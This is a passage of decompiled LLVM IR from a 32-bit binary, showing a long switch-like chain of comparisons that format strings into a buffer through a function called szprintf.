dec_label_pc_804a107:                             ; preds = %dec_label_pc_804a101
  %v0_804a107 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a107 = zext i8 %v0_804a107 to i32
  store i32 %v1_804a107, i32* @edx, align 4
  %v0_804a111 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a111 = zext i8 %v0_804a111 to i32
  %v2_804a120 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a120, i32* @ebx, align 4
  %v4_804a132 = call i32 @szprintf(i32 %v2_804a120, i32 ptrtoint ([14 x i8]* @global_var_80584d7.51 to i32), i32 %v1_804a111)
  br label %dec_label_pc_804a137

dec_label_pc_804a137:                             ; preds = %dec_label_pc_804a101, %dec_label_pc_804a107
  %v13_804a137 = icmp eq i32 %v2_8049efa, 10
  %v1_804a13b = icmp eq i1 %v13_804a137, false
  br i1 %v1_804a13b, label %dec_label_pc_804a16d, label %dec_label_pc_804a13d

dec_label_pc_804a13d:                             ; preds = %dec_label_pc_804a137
  %v0_804a13d = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a13d = zext i8 %v0_804a13d to i32
  store i32 %v1_804a13d, i32* @edx, align 4
  %v0_804a147 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a147 = zext i8 %v0_804a147 to i32
  %v2_804a156 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a156, i32* @ebx, align 4
  %v4_804a168 = call i32 @szprintf(i32 %v2_804a156, i32 ptrtoint ([14 x i8]* @global_var_80584e5.52 to i32), i32 %v1_804a147)
  br label %dec_label_pc_804a16d

dec_label_pc_804a16d:                             ; preds = %dec_label_pc_804a137, %dec_label_pc_804a13d
  %v13_804a16d = icmp eq i32 %v2_8049efa, 11
  %v1_804a171 = icmp eq i1 %v13_804a16d, false
  br i1 %v1_804a171, label %dec_label_pc_804a1a3, label %dec_label_pc_804a173

dec_label_pc_804a173:                             ; preds = %dec_label_pc_804a16d
  %v0_804a173 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a173 = zext i8 %v0_804a173 to i32
  store i32 %v1_804a173, i32* @edx, align 4
  %v0_804a17d = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a17d = zext i8 %v0_804a17d to i32
  %v2_804a18c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a18c, i32* @ebx, align 4
  %v4_804a19e = call i32 @szprintf(i32 %v2_804a18c, i32 ptrtoint ([11 x i8]* @global_var_80584f3.53 to i32), i32 %v1_804a17d)
  br label %dec_label_pc_804a1a3

dec_label_pc_804a1a3:                             ; preds = %dec_label_pc_804a16d, %dec_label_pc_804a173
  %v13_804a1a3 = icmp eq i32 %v2_8049efa, 12
  %v1_804a1a7 = icmp eq i1 %v13_804a1a3, false
  br i1 %v1_804a1a7, label %dec_label_pc_804a1d9, label %dec_label_pc_804a1a9

dec_label_pc_804a1a9:                             ; preds = %dec_label_pc_804a1a3
  %v0_804a1a9 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a1a9 = zext i8 %v0_804a1a9 to i32
  store i32 %v1_804a1a9, i32* @edx, align 4
  %v0_804a1b3 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a1b3 = zext i8 %v0_804a1b3 to i32
  %v2_804a1c2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1c2, i32* @ebx, align 4
  %v4_804a1d4 = call i32 @szprintf(i32 %v2_804a1c2, i32 ptrtoint ([14 x i8]* @global_var_80584fe.54 to i32), i32 %v1_804a1b3)
  br label %dec_label_pc_804a1d9

dec_label_pc_804a1d9:                             ; preds = %dec_label_pc_804a1a3, %dec_label_pc_804a1a9
  %v13_804a1d9 = icmp eq i32 %v2_8049efa, 13
  %v1_804a1dd = icmp eq i1 %v13_804a1d9, false
  br i1 %v1_804a1dd, label %dec_label_pc_804a20f, label %dec_label_pc_804a1df

dec_label_pc_804a1df:                             ; preds = %dec_label_pc_804a1d9
  %v0_804a1df = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a1df = zext i8 %v0_804a1df to i32
  store i32 %v1_804a1df, i32* @edx, align 4
  %v0_804a1e9 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a1e9 = zext i8 %v0_804a1e9 to i32
  %v2_804a1f8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1f8, i32* @ebx, align 4
  %v4_804a20a = call i32 @szprintf(i32 %v2_804a1f8, i32 ptrtoint ([13 x i8]* @global_var_805850c.55 to i32), i32 %v1_804a1e9)
  br label %dec_label_pc_804a20f

dec_label_pc_804a20f:                             ; preds = %dec_label_pc_804a1d9, %dec_label_pc_804a1df
  %v13_804a20f = icmp eq i32 %v2_8049efa, 14
  %v1_804a213 = icmp eq i1 %v13_804a20f, false
  br i1 %v1_804a213, label %dec_label_pc_804a245, label %dec_label_pc_804a215

dec_label_pc_804a215:                             ; preds = %dec_label_pc_804a20f
  %v0_804a215 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a215 = zext i8 %v0_804a215 to i32
  store i32 %v1_804a215, i32* @edx, align 4
  %v0_804a21f = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a21f = zext i8 %v0_804a21f to i32
  %v2_804a22e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a22e, i32* @ebx, align 4
  %v4_804a240 = call i32 @szprintf(i32 %v2_804a22e, i32 ptrtoint ([13 x i8]* @global_var_8058519.56 to i32), i32 %v1_804a21f)
  br label %dec_label_pc_804a245

dec_label_pc_804a245:                             ; preds = %dec_label_pc_804a20f, %dec_label_pc_804a215
  %v13_804a245 = icmp eq i32 %v2_8049efa, 15
  %v1_804a249 = icmp eq i1 %v13_804a245, false
  br i1 %v1_804a249, label %dec_label_pc_804a27b, label %dec_label_pc_804a24b

dec_label_pc_804a24b:                             ; preds = %dec_label_pc_804a245
  %v0_804a24b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a24b = zext i8 %v0_804a24b to i32
  store i32 %v1_804a24b, i32* @edx, align 4
  %v0_804a255 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a255 = zext i8 %v0_804a255 to i32
  %v2_804a264 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a264, i32* @ebx, align 4
  %v4_804a276 = call i32 @szprintf(i32 %v2_804a264, i32 ptrtoint ([13 x i8]* @global_var_8058526.57 to i32), i32 %v1_804a255)
  br label %dec_label_pc_804a27b

dec_label_pc_804a27b:                             ; preds = %dec_label_pc_804a245, %dec_label_pc_804a24b
  %v10_804a27b = icmp eq i32 %v2_8049efa, 16
  %v1_804a27f = icmp eq i1 %v10_804a27b, false
  br i1 %v1_804a27f, label %dec_label_pc_804a2b1, label %dec_label_pc_804a281

dec_label_pc_804a281:                             ; preds = %dec_label_pc_804a27b
  %v0_804a281 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a281 = zext i8 %v0_804a281 to i32
  store i32 %v1_804a281, i32* @edx, align 4
  %v0_804a28b = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a28b = zext i8 %v0_804a28b to i32
  %v2_804a29a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a29a, i32* @ebx, align 4
  %v4_804a2ac = call i32 @szprintf(i32 %v2_804a29a, i32 ptrtoint ([14 x i8]* @global_var_8058533.58 to i32), i32 %v1_804a28b)
  br label %dec_label_pc_804a2b1

dec_label_pc_804a2b1:                             ; preds = %dec_label_pc_804a27b, %dec_label_pc_804a281
  %v13_804a2b1 = icmp eq i32 %v2_8049efa, 17
  %v1_804a2b5 = icmp eq i1 %v13_804a2b1, false
  br i1 %v1_804a2b5, label %dec_label_pc_804a2e7, label %dec_label_pc_804a2b7

dec_label_pc_804a2b7:                             ; preds = %dec_label_pc_804a2b1
  %v0_804a2b7 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a2b7 = zext i8 %v0_804a2b7 to i32
  store i32 %v1_804a2b7, i32* @edx, align 4
  %v0_804a2c1 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a2c1 = zext i8 %v0_804a2c1 to i32
  %v2_804a2d0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2d0, i32* @ebx, align 4
  %v4_804a2e2 = call i32 @szprintf(i32 %v2_804a2d0, i32 ptrtoint ([13 x i8]* @global_var_8058541.59 to i32), i32 %v1_804a2c1)
  br label %dec_label_pc_804a2e7

dec_label_pc_804a2e7:                             ; preds = %dec_label_pc_804a2b1, %dec_label_pc_804a2b7
  %v13_804a2e7 = icmp eq i32 %v2_8049efa, 18
  %v1_804a2eb = icmp eq i1 %v13_804a2e7, false
  br i1 %v1_804a2eb, label %dec_label_pc_804a31d, label %dec_label_pc_804a2ed

dec_label_pc_804a2ed:                             ; preds = %dec_label_pc_804a2e7
  %v0_804a2ed = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a2ed = zext i8 %v0_804a2ed to i32
  store i32 %v1_804a2ed, i32* @edx, align 4
  %v0_804a2f7 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a2f7 = zext i8 %v0_804a2f7 to i32
  %v2_804a306 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a306, i32* @ebx, align 4
  %v4_804a318 = call i32 @szprintf(i32 %v2_804a306, i32 ptrtoint ([13 x i8]* @global_var_805854e.60 to i32), i32 %v1_804a2f7)
  br label %dec_label_pc_804a31d

dec_label_pc_804a31d:                             ; preds = %dec_label_pc_804a2e7, %dec_label_pc_804a2ed
  %v13_804a31d = icmp eq i32 %v2_8049efa, 19
  %v1_804a321 = icmp eq i1 %v13_804a31d, false
  br i1 %v1_804a321, label %dec_label_pc_804a353, label %dec_label_pc_804a323

dec_label_pc_804a323:                             ; preds = %dec_label_pc_804a31d
  %v0_804a323 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a323 = zext i8 %v0_804a323 to i32
  store i32 %v1_804a323, i32* @edx, align 4
  %v0_804a32d = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a32d = zext i8 %v0_804a32d to i32
  %v2_804a33c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a33c, i32* @ebx, align 4
  %v4_804a34e = call i32 @szprintf(i32 %v2_804a33c, i32 ptrtoint ([11 x i8]* @global_var_805855b.61 to i32), i32 %v1_804a32d)
  br label %dec_label_pc_804a353

dec_label_pc_804a353:                             ; preds = %dec_label_pc_804a31d, %dec_label_pc_804a323
  %v13_804a353 = icmp eq i32 %v2_8049efa, 20
  %v1_804a357 = icmp eq i1 %v13_804a353, false
  br i1 %v1_804a357, label %dec_label_pc_804a389, label %dec_label_pc_804a359

dec_label_pc_804a359:                             ; preds = %dec_label_pc_804a353
  %v0_804a359 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a359 = zext i8 %v0_804a359 to i32
  store i32 %v1_804a359, i32* @edx, align 4
  %v0_804a363 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a363 = zext i8 %v0_804a363 to i32
  %v2_804a372 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a372, i32* @ebx, align 4
  %v4_804a384 = call i32 @szprintf(i32 %v2_804a372, i32 ptrtoint ([12 x i8]* @global_var_8058566.62 to i32), i32 %v1_804a363)
  br label %dec_label_pc_804a389

dec_label_pc_804a389:                             ; preds = %dec_label_pc_804a353, %dec_label_pc_804a359
  %v13_804a389 = icmp eq i32 %v2_8049efa, 21
  %v1_804a38d = icmp eq i1 %v13_804a389, false
  br i1 %v1_804a38d, label %dec_label_pc_804a3bf, label %dec_label_pc_804a38f

dec_label_pc_804a38f:                             ; preds = %dec_label_pc_804a389
  %v0_804a38f = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a38f = zext i8 %v0_804a38f to i32
  store i32 %v1_804a38f, i32* @edx, align 4
  %v0_804a399 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a399 = zext i8 %v0_804a399 to i32
  %v2_804a3a8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3a8, i32* @ebx, align 4
  %v4_804a3ba = call i32 @szprintf(i32 %v2_804a3a8, i32 ptrtoint ([14 x i8]* @global_var_8058572.63 to i32), i32 %v1_804a399)
  br label %dec_label_pc_804a3bf

dec_label_pc_804a3bf:                             ; preds = %dec_label_pc_804a389, %dec_label_pc_804a38f
  %v13_804a3bf = icmp eq i32 %v2_8049efa, 22
  %v1_804a3c3 = icmp eq i1 %v13_804a3bf, false
  br i1 %v1_804a3c3, label %dec_label_pc_804a3f5, label %dec_label_pc_804a3c5

dec_label_pc_804a3c5:                             ; preds = %dec_label_pc_804a3bf
  %v0_804a3c5 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a3c5 = zext i8 %v0_804a3c5 to i32
  store i32 %v1_804a3c5, i32* @edx, align 4
  %v0_804a3cf = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a3cf = zext i8 %v0_804a3cf to i32
  %v2_804a3de = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3de, i32* @ebx, align 4
  %v4_804a3f0 = call i32 @szprintf(i32 %v2_804a3de, i32 ptrtoint ([12 x i8]* @global_var_8058580.64 to i32), i32 %v1_804a3cf)
  br label %dec_label_pc_804a3f5

dec_label_pc_804a3f5:                             ; preds = %dec_label_pc_804a3bf, %dec_label_pc_804a3c5
  %v13_804a3f5 = icmp eq i32 %v2_8049efa, 23
  %v1_804a3f9 = icmp eq i1 %v13_804a3f5, false
  br i1 %v1_804a3f9, label %dec_label_pc_804a42b, label %dec_label_pc_804a3fb

dec_label_pc_804a3fb:                             ; preds = %dec_label_pc_804a3f5
  %v0_804a3fb = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a3fb = zext i8 %v0_804a3fb to i32
  store i32 %v1_804a3fb, i32* @edx, align 4
  %v0_804a405 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a405 = zext i8 %v0_804a405 to i32
  %v2_804a414 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a414, i32* @ebx, align 4
  %v4_804a426 = call i32 @szprintf(i32 %v2_804a414, i32 ptrtoint ([12 x i8]* @global_var_805858c.65 to i32), i32 %v1_804a405)
  br label %dec_label_pc_804a42b

dec_label_pc_804a42b:                             ; preds = %dec_label_pc_804a3f5, %dec_label_pc_804a3fb
  %v13_804a42b = icmp eq i32 %v2_8049efa, 24
  %v1_804a42f = icmp eq i1 %v13_804a42b, false
  br i1 %v1_804a42f, label %dec_label_pc_804a461, label %dec_label_pc_804a431

dec_label_pc_804a431:                             ; preds = %dec_label_pc_804a42b
  %v0_804a431 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a431 = zext i8 %v0_804a431 to i32
  store i32 %v1_804a431, i32* @edx, align 4
  %v0_804a43b = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a43b = zext i8 %v0_804a43b to i32
  %v2_804a44a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a44a, i32* @ebx, align 4
  %v4_804a45c = call i32 @szprintf(i32 %v2_804a44a, i32 ptrtoint ([13 x i8]* @global_var_8058598.66 to i32), i32 %v1_804a43b)
  br label %dec_label_pc_804a461

dec_label_pc_804a461:                             ; preds = %dec_label_pc_804a42b, %dec_label_pc_804a431
  %v13_804a461 = icmp eq i32 %v2_8049efa, 25
  %v1_804a465 = icmp eq i1 %v13_804a461, false
  br i1 %v1_804a465, label %dec_label_pc_804a497, label %dec_label_pc_804a467

dec_label_pc_804a467:                             ; preds = %dec_label_pc_804a461
  %v0_804a467 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a467 = zext i8 %v0_804a467 to i32
  store i32 %v1_804a467, i32* @edx, align 4
  %v0_804a471 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a471 = zext i8 %v0_804a471 to i32
  %v2_804a480 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a480, i32* @ebx, align 4
  %v4_804a492 = call i32 @szprintf(i32 %v2_804a480, i32 ptrtoint ([13 x i8]* @global_var_80585a5.67 to i32), i32 %v1_804a471)
  br label %dec_label_pc_804a497

dec_label_pc_804a497:                             ; preds = %dec_label_pc_804a461, %dec_label_pc_804a467
  %v13_804a497 = icmp eq i32 %v2_8049efa, 26
  %v1_804a49b = icmp eq i1 %v13_804a497, false
  br i1 %v1_804a49b, label %dec_label_pc_804a4cd, label %dec_label_pc_804a49d

dec_label_pc_804a49d:                             ; preds = %dec_label_pc_804a497
  %v0_804a49d = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a49d = zext i8 %v0_804a49d to i32
  store i32 %v1_804a49d, i32* @edx, align 4
  %v0_804a4a7 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a4a7 = zext i8 %v0_804a4a7 to i32
  %v2_804a4b6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4b6, i32* @ebx, align 4
  %v4_804a4c8 = call i32 @szprintf(i32 %v2_804a4b6, i32 ptrtoint ([13 x i8]* @global_var_80585b2.68 to i32), i32 %v1_804a4a7)
  br label %dec_label_pc_804a4cd

dec_label_pc_804a4cd:                             ; preds = %dec_label_pc_804a497, %dec_label_pc_804a49d
  %v13_804a4cd = icmp eq i32 %v2_8049efa, 27
  %v1_804a4d1 = icmp eq i1 %v13_804a4cd, false
  br i1 %v1_804a4d1, label %dec_label_pc_804a503, label %dec_label_pc_804a4d3

dec_label_pc_804a4d3:                             ; preds = %dec_label_pc_804a4cd
  %v0_804a4d3 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a4d3 = zext i8 %v0_804a4d3 to i32
  store i32 %v1_804a4d3, i32* @edx, align 4
  %v0_804a4dd = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a4dd = zext i8 %v0_804a4dd to i32
  %v2_804a4ec = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4ec, i32* @ebx, align 4
  %v4_804a4fe = call i32 @szprintf(i32 %v2_804a4ec, i32 ptrtoint ([14 x i8]* @global_var_80585bf.69 to i32), i32 %v1_804a4dd)
  br label %dec_label_pc_804a503

dec_label_pc_804a503:                             ; preds = %dec_label_pc_804a4cd, %dec_label_pc_804a4d3
  %v13_804a503 = icmp eq i32 %v2_8049efa, 28
  %v1_804a507 = icmp eq i1 %v13_804a503, false
  br i1 %v1_804a507, label %dec_label_pc_804a539, label %dec_label_pc_804a509

dec_label_pc_804a509:                             ; preds = %dec_label_pc_804a503
  %v0_804a509 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a509 = zext i8 %v0_804a509 to i32
  store i32 %v1_804a509, i32* @edx, align 4
  %v0_804a513 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a513 = zext i8 %v0_804a513 to i32
  %v2_804a522 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a522, i32* @ebx, align 4
  %v4_804a534 = call i32 @szprintf(i32 %v2_804a522, i32 ptrtoint ([14 x i8]* @global_var_80585cd.70 to i32), i32 %v1_804a513)
  br label %dec_label_pc_804a539

dec_label_pc_804a539:                             ; preds = %dec_label_pc_804a503, %dec_label_pc_804a509
  %v13_804a539 = icmp eq i32 %v2_8049efa, 29
  %v1_804a53d = icmp eq i1 %v13_804a539, false
  br i1 %v1_804a53d, label %dec_label_pc_804a56f, label %dec_label_pc_804a53f

dec_label_pc_804a53f:                             ; preds = %dec_label_pc_804a539
  %v0_804a53f = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a53f = zext i8 %v0_804a53f to i32
  store i32 %v1_804a53f, i32* @edx, align 4
  %v0_804a549 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a549 = zext i8 %v0_804a549 to i32
  %v2_804a558 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a558, i32* @ebx, align 4
  %v4_804a56a = call i32 @szprintf(i32 %v2_804a558, i32 ptrtoint ([12 x i8]* @global_var_80585db.71 to i32), i32 %v1_804a549)
  br label %dec_label_pc_804a56f

dec_label_pc_804a56f:                             ; preds = %dec_label_pc_804a539, %dec_label_pc_804a53f
  %v13_804a56f = icmp eq i32 %v2_8049efa, 30
  %v1_804a573 = icmp eq i1 %v13_804a56f, false
  br i1 %v1_804a573, label %dec_label_pc_804a5a5, label %dec_label_pc_804a575

dec_label_pc_804a575:                             ; preds = %dec_label_pc_804a56f
  %v0_804a575 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a575 = zext i8 %v0_804a575 to i32
  store i32 %v1_804a575, i32* @edx, align 4
  %v0_804a57f = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a57f = zext i8 %v0_804a57f to i32
  %v2_804a58e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a58e, i32* @ebx, align 4
  %v4_804a5a0 = call i32 @szprintf(i32 %v2_804a58e, i32 ptrtoint ([13 x i8]* @global_var_80585e7.72 to i32), i32 %v1_804a57f)
  br label %dec_label_pc_804a5a5

dec_label_pc_804a5a5:                             ; preds = %dec_label_pc_804a56f, %dec_label_pc_804a575
  %v13_804a5a5 = icmp eq i32 %v2_8049efa, 31
  %v1_804a5a9 = icmp eq i1 %v13_804a5a5, false
  br i1 %v1_804a5a9, label %dec_label_pc_804a5db, label %dec_label_pc_804a5ab

dec_label_pc_804a5ab:                             ; preds = %dec_label_pc_804a5a5
  %v0_804a5ab = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a5ab = zext i8 %v0_804a5ab to i32
  store i32 %v1_804a5ab, i32* @edx, align 4
  %v0_804a5b5 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a5b5 = zext i8 %v0_804a5b5 to i32
  %v2_804a5c4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5c4, i32* @ebx, align 4
  %v4_804a5d6 = call i32 @szprintf(i32 %v2_804a5c4, i32 ptrtoint ([12 x i8]* @global_var_80585f4.73 to i32), i32 %v1_804a5b5)
  br label %dec_label_pc_804a5db

dec_label_pc_804a5db:                             ; preds = %dec_label_pc_804a5a5, %dec_label_pc_804a5ab
  %v10_804a5db = icmp eq i32 %v2_8049efa, 32
  %v1_804a5df = icmp eq i1 %v10_804a5db, false
  br i1 %v1_804a5df, label %dec_label_pc_804a611, label %dec_label_pc_804a5e1

dec_label_pc_804a5e1:                             ; preds = %dec_label_pc_804a5db
  %v0_804a5e1 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a5e1 = zext i8 %v0_804a5e1 to i32
  store i32 %v1_804a5e1, i32* @edx, align 4
  %v0_804a5eb = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a5eb = zext i8 %v0_804a5eb to i32
  %v2_804a5fa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5fa, i32* @ebx, align 4
  %v4_804a60c = call i32 @szprintf(i32 %v2_804a5fa, i32 ptrtoint ([11 x i8]* @global_var_8058600.74 to i32), i32 %v1_804a5eb)
  br label %dec_label_pc_804a611

dec_label_pc_804a611:                             ; preds = %dec_label_pc_804a5db, %dec_label_pc_804a5e1
  %v13_804a611 = icmp eq i32 %v2_8049efa, 33
  %v1_804a615 = icmp eq i1 %v13_804a611, false
  br i1 %v1_804a615, label %dec_label_pc_804a647, label %dec_label_pc_804a617

dec_label_pc_804a617:                             ; preds = %dec_label_pc_804a611
  %v0_804a617 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a617 = zext i8 %v0_804a617 to i32
  store i32 %v1_804a617, i32* @edx, align 4
  %v0_804a621 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a621 = zext i8 %v0_804a621 to i32
  %v2_804a630 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a630, i32* @ebx, align 4
  %v4_804a642 = call i32 @szprintf(i32 %v2_804a630, i32 ptrtoint ([12 x i8]* @global_var_805860b.75 to i32), i32 %v1_804a621)
  br label %dec_label_pc_804a647

dec_label_pc_804a647:                             ; preds = %dec_label_pc_804a611, %dec_label_pc_804a617
  %v13_804a647 = icmp eq i32 %v2_8049efa, 34
  %v1_804a64b = icmp eq i1 %v13_804a647, false
  br i1 %v1_804a64b, label %dec_label_pc_804a67d, label %dec_label_pc_804a64d

dec_label_pc_804a64d:                             ; preds = %dec_label_pc_804a647
  %v0_804a64d = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a64d = zext i8 %v0_804a64d to i32
  store i32 %v1_804a64d, i32* @edx, align 4
  %v0_804a657 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a657 = zext i8 %v0_804a657 to i32
  %v2_804a666 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a666, i32* @ebx, align 4
  %v4_804a678 = call i32 @szprintf(i32 %v2_804a666, i32 ptrtoint ([12 x i8]* @global_var_8058617.76 to i32), i32 %v1_804a657)
  br label %dec_label_pc_804a67d

dec_label_pc_804a67d:                             ; preds = %dec_label_pc_804a647, %dec_label_pc_804a64d
  %v13_804a67d = icmp eq i32 %v2_8049efa, 35
  %v1_804a681 = icmp eq i1 %v13_804a67d, false
  br i1 %v1_804a681, label %dec_label_pc_804a6b3, label %dec_label_pc_804a683

dec_label_pc_804a683:                             ; preds = %dec_label_pc_804a67d
  %v0_804a683 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a683 = zext i8 %v0_804a683 to i32
  store i32 %v1_804a683, i32* @edx, align 4
  %v0_804a68d = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a68d = zext i8 %v0_804a68d to i32
  %v2_804a69c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a69c, i32* @ebx, align 4
  %v4_804a6ae = call i32 @szprintf(i32 %v2_804a69c, i32 ptrtoint ([12 x i8]* @global_var_8058623.77 to i32), i32 %v1_804a68d)
  br label %dec_label_pc_804a6b3

dec_label_pc_804a6b3:                             ; preds = %dec_label_pc_804a67d, %dec_label_pc_804a683
  %v13_804a6b3 = icmp eq i32 %v2_8049efa, 36
  %v1_804a6b7 = icmp eq i1 %v13_804a6b3, false
  br i1 %v1_804a6b7, label %dec_label_pc_804a6e9, label %dec_label_pc_804a6b9

dec_label_pc_804a6b9:                             ; preds = %dec_label_pc_804a6b3
  %v0_804a6b9 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a6b9 = zext i8 %v0_804a6b9 to i32
  store i32 %v1_804a6b9, i32* @edx, align 4
  %v0_804a6c3 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a6c3 = zext i8 %v0_804a6c3 to i32
  %v2_804a6d2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6d2, i32* @ebx, align 4
  %v4_804a6e4 = call i32 @szprintf(i32 %v2_804a6d2, i32 ptrtoint ([12 x i8]* @global_var_805862f.78 to i32), i32 %v1_804a6c3)
  br label %dec_label_pc_804a6e9

dec_label_pc_804a6e9:                             ; preds = %dec_label_pc_804a6b3, %dec_label_pc_804a6b9
  %v13_804a6e9 = icmp eq i32 %v2_8049efa, 37
  %v1_804a6ed = icmp eq i1 %v13_804a6e9, false
  br i1 %v1_804a6ed, label %dec_label_pc_804a71f, label %dec_label_pc_804a6ef

dec_label_pc_804a6ef:                             ; preds = %dec_label_pc_804a6e9
  %v0_804a6ef = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a6ef = zext i8 %v0_804a6ef to i32
  store i32 %v1_804a6ef, i32* @edx, align 4
  %v0_804a6f9 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a6f9 = zext i8 %v0_804a6f9 to i32
  %v2_804a708 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a708, i32* @ebx, align 4
  %v4_804a71a = call i32 @szprintf(i32 %v2_804a708, i32 ptrtoint ([12 x i8]* @global_var_805863b.79 to i32), i32 %v1_804a6f9)
  br label %dec_label_pc_804a71f

dec_label_pc_804a71f:                             ; preds = %dec_label_pc_804a6e9, %dec_label_pc_804a6ef
  %v13_804a71f = icmp eq i32 %v2_8049efa, 38
  %v1_804a723 = icmp eq i1 %v13_804a71f, false
  br i1 %v1_804a723, label %dec_label_pc_804a755, label %dec_label_pc_804a725

dec_label_pc_804a725:                             ; preds = %dec_label_pc_804a71f
  %v0_804a725 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a725 = zext i8 %v0_804a725 to i32
  store i32 %v1_804a725, i32* @edx, align 4
  %v0_804a72f = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a72f = zext i8 %v0_804a72f to i32
  %v2_804a73e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a73e, i32* @ebx, align 4
  %v4_804a750 = call i32 @szprintf(i32 %v2_804a73e, i32 ptrtoint ([13 x i8]* @global_var_8058647.80 to i32), i32 %v1_804a72f)
  br label %dec_label_pc_804a755

dec_label_pc_804a755:                             ; preds = %dec_label_pc_804a71f, %dec_label_pc_804a725
  %v13_804a755 = icmp eq i32 %v2_8049efa, 39
  %v1_804a759 = icmp eq i1 %v13_804a755, false
  br i1 %v1_804a759, label %dec_label_pc_804a78b, label %dec_label_pc_804a75b

dec_label_pc_804a75b:                             ; preds = %dec_label_pc_804a755
  %v0_804a75b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a75b = zext i8 %v0_804a75b to i32
  store i32 %v1_804a75b, i32* @edx, align 4
  %v0_804a765 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a765 = zext i8 %v0_804a765 to i32
  %v2_804a774 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a774, i32* @ebx, align 4
  %v4_804a786 = call i32 @szprintf(i32 %v2_804a774, i32 ptrtoint ([13 x i8]* @global_var_8058654.81 to i32), i32 %v1_804a765)
  br label %dec_label_pc_804a78b

dec_label_pc_804a78b:                             ; preds = %dec_label_pc_804a755, %dec_label_pc_804a75b
